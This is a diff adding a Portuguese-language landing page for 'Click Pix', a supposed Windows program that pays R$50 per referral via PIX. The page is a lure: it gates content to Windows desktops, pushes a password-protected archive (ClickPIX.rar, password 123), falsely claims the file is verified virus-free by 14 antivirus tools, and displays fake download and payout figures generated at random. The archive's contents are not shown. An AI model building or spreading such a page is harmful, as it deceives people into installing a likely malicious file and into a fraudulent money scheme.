@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Click Pix - Programa para Computador | Ganhe R$100 a cada 2 indicações</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --primary: #2A2D7C;
+            --secondary: #1E90FF;
+            --accent: #FF6B35;
+            --light: #F8F9FA;
+            --dark: #212529;
+            --success: #28a745;
+            --warning: #ffc107;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: var(--light);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Aviso para Mobile */
+        .mobile-warning {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .mobile-warning i {
+            font-size: 4rem;
+            color: var(--warning);
+            margin-bottom: 20px;
+        }
+
+        .mobile-warning h2 {
+            font-size: 2rem;
+            color: var(--warning);
+            margin-bottom: 20px;
+        }
+
+        .mobile-warning p {
+            font-size: 1.2rem;
+            max-width: 600px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .device-icon {
+            font-size: 3rem;
+            color: var(--secondary);
+            margin: 20px 0;
+        }
+
+        /* Container Principal */
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        header {
+            background: rgba(42, 45, 124, 0.9);
+            backdrop-filter: blur(10px);
+            padding: 20px 0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 2px solid var(--accent);
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo-icon {
+            font-size: 2.5rem;
+            color: var(--accent);
+        }
+
+        .logo-text h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            background: linear-gradient(to right, #FF6B35, #1E90FF);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .logo-text p {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        .platform-tag {
+            background: var(--accent);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 5px;
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 100px 0 60px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 100%;
+            background: radial-gradient(circle at 50% 50%, rgba(30, 144, 255, 0.1) 0%, transparent 70%);
+            z-index: -1;
+        }
+
+        .hero h2 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            background: linear-gradient(to right, #FF6B35, #1E90FF);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .hero-subtitle {
+            font-size: 1.5rem;
+            margin-bottom: 30px;
+            color: #d1d1d1;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .highlight-box {
+            background: rgba(255, 107, 53, 0.1);
+            border: 2px solid var(--accent);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 40px auto;
+            max-width: 900px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .highlight-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.05) 50%, transparent 70%);
+            z-index: 0;
+        }
+
+        .highlight-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .highlight-content h3 {
+            font-size: 2rem;
+            color: var(--accent);
+            margin-bottom: 20px;
+        }
+
+        .money-badge {
+            background: linear-gradient(to right, #28a745, #20c997);
+            color: white;
+            padding: 10px 25px;
+            border-radius: 50px;
+            font-size: 2.5rem;
+            font-weight: 800;
+            display: inline-block;
+            margin: 20px 0;
+            box-shadow: 0 10px 20px rgba(40, 167, 69, 0.3);
+            border: 3px solid white;
+        }
+
+        .money-badge small {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+
+        /* Como Funciona */
+        .steps {
+            padding: 80px 0;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 30px;
+            margin: 40px auto;
+            max-width: 1200px;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 50px;
+            color: var(--light);
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 150px;
+            height: 4px;
+            background: linear-gradient(to right, var(--accent), var(--secondary));
+            border-radius: 2px;
+        }
+
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 30px;
+            margin-top: 50px;
+        }
+
+        .step-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 30px;
+            text-align: center;
+            transition: all 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .step-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(to right, var(--accent), var(--secondary));
+        }
+
+        .step-card:hover {
+            transform: translateY(-10px);
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.2);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .step-number {
+            display: inline-block;
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(to right, var(--accent), var(--secondary));
+            color: white;
+            line-height: 60px;
+            border-radius: 50%;
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            border: 3px solid white;
+        }
+
+        .step-card h3 {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: var(--secondary);
+        }
+
+        /* Programa Preview */
+        .program-preview {
+            padding: 80px 0;
+            text-align: center;
+        }
+
+        .program-container {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 40px;
+            margin-top: 40px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .program-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 30% 30%, rgba(30, 144, 255, 0.1) 0%, transparent 50%);
+        }
+
+        .program-mockup {
+            background: #1e1e1e;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 30px auto;
+            max-width: 800px;
+            text-align: left;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            border: 1px solid #333;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .program-header {
+            background: #2d2d2d;
+            padding: 15px;
+            border-radius: 8px 8px 0 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #444;
+        }
+
+        .window-controls {
+            display: flex;
+            gap: 10px;
+        }
+
+        .control {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .control.close { background: #ff5f56; }
+        .control.minimize { background: #ffbd2e; }
+        .control.maximize { background: #27ca3f; }
+
+        .program-content {
+            padding: 30px;
+            background: #252525;
+            border-radius: 0 0 8px 8px;
+            min-height: 300px;
+        }
+
+        .program-line {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            gap: 10px;
+        }
+
+        .program-line i {
+            color: var(--secondary);
+            width: 20px;
+        }
+
+        /* Download Section */
+        .download-section {
+            padding: 80px 0;
+            text-align: center;
+        }
+
+        .download-box {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 20px;
+            padding: 50px;
+            margin: 0 auto;
+            max-width: 800px;
+            box-shadow: 0 20px 40px rgba(30, 144, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .download-box::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
+            animation: pulse 4s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+
+        .download-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .download-title {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+        }
+
+        .download-subtitle {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            opacity: 0.9;
+        }
+
+        .requirements {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 30px 0;
+            text-align: left;
+        }
+
+        .requirements h4 {
+            color: var(--accent);
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+
+        .requirements ul {
+            list-style: none;
+            padding-left: 20px;
+        }
+
+        .requirements li {
+            margin-bottom: 10px;
+            padding-left: 30px;
+            position: relative;
+        }
+
+        .requirements li::before {
+            content: '✓';
+            position: absolute;
+            left: 0;
+            color: var(--success);
+            font-weight: bold;
+        }
+
+        .download-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            background: linear-gradient(to right, #FF6B35, #FF8E53);
+            color: white;
+            padding: 20px 50px;
+            font-size: 1.5rem;
+            font-weight: 700;
+            border-radius: 50px;
+            text-decoration: none;
+            margin-top: 30px;
+            box-shadow: 0 15px 30px rgba(255, 107, 53, 0.4);
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+
+        .download-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(255, 107, 53, 0.6);
+            background: linear-gradient(to right, #FF8E53, #FF6B35);
+        }
+
+        .file-info {
+            margin-top: 20px;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        /* Footer */
+        footer {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 40px 0;
+            margin-top: 80px;
+            text-align: center;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 30px;
+        }
+
+        .social-icons {
+            display: flex;
+            gap: 20px;
+        }
+
+        .social-icons a {
+            color: white;
+            font-size: 1.5rem;
+            transition: all 0.3s;
+        }
+
+        .social-icons a:hover {
+            color: var(--accent);
+            transform: translateY(-5px);
+        }
+
+        .copyright {
+            margin-top: 30px;
+            font-size: 0.9rem;
+            opacity: 0.7;
+            width: 100%;
+        }
+
+        /* Responsividade para desktop apenas */
+        @media (max-width: 1024px) {
+            .container {
+                padding: 0 15px;
+            }
+            
+            .hero h2 {
+                font-size: 2.8rem;
+            }
+            
+            .steps-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .mobile-warning {
+                display: flex;
+            }
+            
+            .main-content {
+                display: none;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .steps-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Aviso para Mobile -->
+    <div class="mobile-warning">
+        <i class="fas fa-exclamation-triangle"></i>
+        <h2>Acesso Restrito a Computadores</h2>
+        <p>O <strong>Click Pix</strong> é um programa exclusivo para <strong>computadores e notebooks</strong>.</p>
+        <p>Para usar nossa plataforma e começar a ganhar dinheiro, você precisa acessar este site de um computador com Windows, macOS ou Linux.</p>
+        
+        <div class="device-icon">
+            <i class="fas fa-laptop"></i>
+            <i class="fas fa-desktop"></i>
+        </div>
+        
+        <p><strong>Por que apenas em computadores?</strong></p>
+        <p>Nosso programa precisa de recursos específicos que só estão disponíveis em sistemas operacionais de computadores.</p>
+        
+        <div style="margin-top: 30px; padding: 20px; background: rgba(255, 255, 255, 0.1); border-radius: 10px; max-width: 500px;">
+            <p><i class="fas fa-lightbulb"></i> <strong>Dica:</strong> Salve este link e acesse de um computador para baixar o programa e começar a ganhar!</p>
+        </div>
+    </div>
+
+    <!-- Conteúdo Principal (visível apenas em desktop) -->
+    <div class="main-content">
+        <!-- Header -->
+        <header>
+            <div class="container header-content">
+                <div class="logo">
+                    <div class="logo-icon">
+                        <i class="fas fa-desktop"></i>
+                    </div>
+                    <div class="logo-text">
+                        <h1>CLICK PIX</h1>
+                        <p>Programa para Computador | Ganhe dinheiro com indicações</p>
+                        <div class="platform-tag">
+                            <i class="fab fa-windows"></i>
+                            Compatível com apenas com Windows
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="platform-tag">
+                    <i class="fas fa-desktop"></i>
+                    Exclusivo para Computadores
+                </div>
+            </div>
+        </header>
+
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="container">
+                <h2>Ganhe R$100 a cada 2 indicações!</h2>
+                <p class="hero-subtitle">Baixe o programa Click Pix para seu computador, cadastre-se e comece a faturar com cada pessoa que você indicar</p>
+                
+                <div class="highlight-box">
+                    <div class="highlight-content">
+                        <h3>Como você ganha dinheiro:</h3>
+                        <p>1. Baixe e instale o programa Click Pix em seu computador</p>
+                        <p>2. Crie sua conta gratuitamente, pelo programa aberto</p>
+                        <p>3. Compartilhe seu link exclusivo com amigos</p>
+                        <p>4. Cadastre sua chave PIX para receber seus ganhos</p>
+                        <p>5. Cada pessoa que criar conta através do seu link vale <strong>R$50,00</strong> para você no PIX, sem enrolação!</p>
+                        
+                        <div class="money-badge">
+                            R$ 100,00 <small>a cada 2 indicações</small>
+                        </div>
+                        
+                        <p><strong>Sem limites!</strong> Quanto mais pessoas você indicar, mais você ganha. Pagamentos diários via PIX.</p>
+                    </div>
+                </div>
+                
+                <a href="/ClickPIX.rar" class="download-button" id="download-btn">
+                    <i class="fas fa-download"></i> BAIXAR PROGRAMA AGORA (Senha: 123)
+                    <i class="fas fa-arrow-down"></i>
+                </a>
+            </div>
+        </section>
+
+        <!-- Como Funciona -->
+        <section class="steps">
+            <div class="container">
+                <h2 class="section-title">Como Funciona</h2>
+                
+                <div class="steps-grid">
+                    <div class="step-card">
+                        <div class="step-number">1</div>
+                        <h3>Baixe o Programa</h3>
+                        <p>Faça o download do Click Pix (arquivo .zip) e extraia no seu computador. Instalação rápida e segura.</p>
+                        <i class="fas fa-download" style="font-size: 2rem; color: var(--accent); margin-top: 20px;"></i>
+                    </div>
+                    
+                    <div class="step-card">
+                        <div class="step-number">2</div>
+                        <h3>Instale e Cadastre</h3>
+                        <p>Execute o instalador, crie sua conta gratuita em menos de 2 minutos. Não precisa de cartão de crédito.</p>
+                        <i class="fas fa-user-plus" style="font-size: 2rem; color: var(--secondary); margin-top: 20px;"></i>
+                    </div>
+                    
+                    <div class="step-card">
+                        <div class="step-number">3</div>
+                        <h3>Compartilhe seu Link</h3>
+                        <p>Dentro do programa, copie seu link exclusivo de indicação e compartilhe com amigos, família e redes sociais.</p>
+                        <i class="fas fa-share-alt" style="font-size: 2rem; color: var(--success); margin-top: 20px;"></i>
+                    </div>
+                    
+                    <div class="step-card">
+                        <div class="step-number">4</div>
+                        <h3>Receba seu Dinheiro</h3>
+                        <p>A cada 1 pessoas que criarem conta através do seu link, você recebe <strong>R$50,00</strong> via PIX. Pagamentos diários!</p>
+                        <i class="fas fa-money-bill-wave" style="font-size: 2rem; color: #FFD700; margin-top: 20px;"></i>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Programa Preview -->
+        <section class="program-preview">
+            <div class="container">
+                <h2 class="section-title">Conheça o Programa Click Pix</h2>
+                
+                <div class="program-container">
+                    <p>Interface moderna e intuitiva, desenvolvida especificamente para computadores</p>
+                    
+                    <div class="program-mockup">
+                        <div class="program-header">
+                            <div>Click Pix - Painel de Controle</div>
+                            <div class="window-controls">
+                                <div class="control close"></div>
+                                <div class="control minimize"></div>
+                                <div class="control maximize"></div>
+                            </div>
+                        </div>
+                        
+                        <div class="program-content">
+                            <div class="program-line">
+                                <i class="fas fa-user"></i>
+                                <span>Usuário: <strong>Você</strong> | Saldo: <strong style="color: var(--success);">R$ 320,00</strong></span>
+                            </div>
+                            
+                            <div class="program-line">
+                                <i class="fas fa-link"></i>
+                                <span>Seu link de indicação: <strong>https://clickpix.com/?ref=SEUCODIGO</strong></span>
+                            </div>
+                            
+                            <div class="program-line">
+                                <i class="fas fa-users"></i>
+                                <span>Indicações realizadas: <strong>32 pessoas</strong> | Ganhos totais: <strong>R$ 320,00</strong></span>
+                            </div>
+                            
+                            <div class="program-line">
+                                <i class="fas fa-chart-line"></i>
+                                <span>Próximo pagamento: <strong>R$ 100,00</strong> (faltam 2 indicações)</span>
+                            </div>
+                            
+                            <div class="program-line">
+                                <i class="fas fa-qrcode"></i>
+                                <span>Receba via PIX: Cadastre sua chave PIX no programa</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <p>Controle total sobre seus ganhos, histórico detalhado e ferramentas para maximizar suas indicações</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Download Section -->
+        <section class="download-section">
+            <div class="container">
+                <div class="download-box">
+                    <div class="download-content">
+                        <h2 class="download-title">Pronto para Começar a Ganhar?</h2>
+                        <p class="download-subtitle">Baixe agora o programa Click Pix para seu computador e comece a faturar em poucos minutos</p>
+                        
+                        <div class="requirements">
+                            <h4><i class="fas fa-check-circle"></i> Requisitos:</h4>
+                            <ul>
+                                <li>Windows 10/11</li>
+                                <li>Conexão com internet</li>
+                                <li>Conta de e-mail válida</li>
+                                <li>Chave PIX para recebimentos</li>
+                            </ul>
+                        </div>
+                        
+                        <a href="/ClickPIX.rar" class="download-button" id="main-download-btn">
+                            <i class="fas fa-download"></i> BAIXAR CLICK PIX (Senha: 123)
+                            <i class="fas fa-arrow-down"></i>
+                        </a>
+                        
+                        <div class="file-info">
+                            <p><i class="fas fa-info-circle"></i> Arquivo: ClickPIX.rar | Tamanho: 85MB | Versão: 2026</p>
+                            <p><i class="fas fa-shield-alt"></i> 100% seguro e livre de vírus. Verificado por 14 antivírus.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer>
+            <div class="container">
+                <div class="footer-content">
+                    <div class="logo">
+                        <div class="logo-icon">
+                            <i class="fas fa-desktop"></i>
+                        </div>
+                        <div class="logo-text">
+                            <h1>CLICK PIX</h1>
+                            <p>Programa para Computador</p>
+                        </div>
+                    </div>
+                    
+                    <div class="social-icons">
+                        <a href="#"><i class="fab fa-whatsapp"></i></a>
+                        <a href="#"><i class="fab fa-telegram"></i></a>
+                        <a href="#"><i class="fab fa-discord"></i></a>
+                        <a href="#"><i class="fas fa-envelope"></i></a>
+                    </div>
+                </div>
+                
+                <div class="copyright">
+                    <p>&copy; 2026 Click Pix. Todos os direitos reservados. | <a href="#" style="color: var(--secondary);">Termos de Uso</a> | <a href="#" style="color: var(--secondary);">Política de Privacidade</a></p>
+                    <p>Este programa funciona apenas em computadores. Não compatível com celulares ou tablets.</p>
+                    <p>Valores sujeitos a alteração. Consulte o programa para detalhes completos sobre ganhos e pagamentos.</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Detectar dispositivo
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+        
+        // Mostrar aviso se for mobile
+        if (isMobileDevice()) {
+            document.querySelector('.mobile-warning').style.display = 'flex';
+            document.querySelector('.main-content').style.display = 'none';
+        }
+        
+        // Estatísticas dinâmicas
+        function updateStats() {
+            // Número aleatório de downloads para demonstração
+            const downloads = Math.floor(Math.random() * 5000) + 10000;
+            const earnings = Math.floor(downloads * 10);
+            
+            // Atualizar elemento se existir
+            const statsElement = document.createElement('div');
+            statsElement.innerHTML = `
+                <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 10px; margin-top: 30px; max-width: 600px; margin-left: auto; margin-right: auto;">
+                    <p><i class="fas fa-users"></i> <strong>${downloads.toLocaleString()}+</strong> pessoas já baixaram e estão ganhando com o Click Pix</p>
+                    <p><i class="fas fa-money-bill-wave"></i> <strong>R$ ${earnings.toLocaleString()}+</strong> já foram pagos para nossos usuários via PIX</p>
+                </div>
+            `;
+            
+            const heroSection = document.querySelector('.hero .container');
+            if (heroSection && !isMobileDevice()) {
+                heroSection.appendChild(statsElement);
+            }
+        }
+        
+        // Executar quando a página carregar
+        document.addEventListener('DOMContentLoaded', function() {
+            if (!isMobileDevice()) {
+                updateStats();
+                
+                // Adicionar contador de indicações
+                const counterElement = document.createElement('div');
+                counterElement.innerHTML = `
+                    <div style="text-align: center; margin: 30px 0;">
+                        <div style="font-size: 1.2rem; color: var(--accent); margin-bottom: 10px;">
+                            <i class="fas fa-bolt"></i> <strong>GANHE R$100,00 A CADA 2 INDICAÇÕES</strong>
+                        </div>
+                        <div style="display: inline-flex; gap: 20px; background: rgba(255,255,255,0.05); padding: 15px 30px; border-radius: 10px;">
+                            <div>
+                                <div style="font-size: 2rem; font-weight: bold; color: var(--success);">2</div>
+                                <div style="font-size: 0.9rem;">Indicações</div>
+                            </div>
+                            <div style="align-self: center;">
+                                <i class="fas fa-equals" style="color: var(--accent);"></i>
+                            </div>
+                            <div>
+                                <div style="font-size: 2rem; font-weight: bold; color: var(--success);">R$ 100</div>
+                                <div style="font-size: 0.9rem;">no seu PIX</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                
+                const highlightBox = document.querySelector('.highlight-content');
+                if (highlightBox) {
+                    highlightBox.appendChild(counterElement);
+                }
+            }
+            
+            // Manipular download
+            const downloadButtons = document.querySelectorAll('#download-btn, #main-download-btn');
+            downloadButtons.forEach(button => {
+                button.addEventListener('click', function(e) {
+                    if (!isMobileDevice()) {
+                        // Em um ambiente real, isso iniciaria o download do arquivo
+                        // Aqui apenas simulamos com um alerta
+                        setTimeout(() => {
+                            alert('Download do Click Pix iniciado! Salve o arquivo ClickPIX.rar em seu computador e extraia para instalar.');
+                        }, 500);
+                    }
+                });
+            });
+        });
+        
+        // Adicionar efeito de digitação no título
+        const heroTitle = document.querySelector('.hero h2');
+        if (heroTitle && !isMobileDevice()) {
+            const originalText = heroTitle.textContent;
+            heroTitle.textContent = '';
+            let i = 0;
+            
+            function typeWriter() {
+                if (i < originalText.length) {
+                    heroTitle.textContent += originalText.charAt(i);
+                    i++;
+                    setTimeout(typeWriter, 50);
+                }
+            }
+            
+            // Iniciar após um breve delay
+            setTimeout(typeWriter, 500);
+        }
+    </script>
+</body>
+</html>
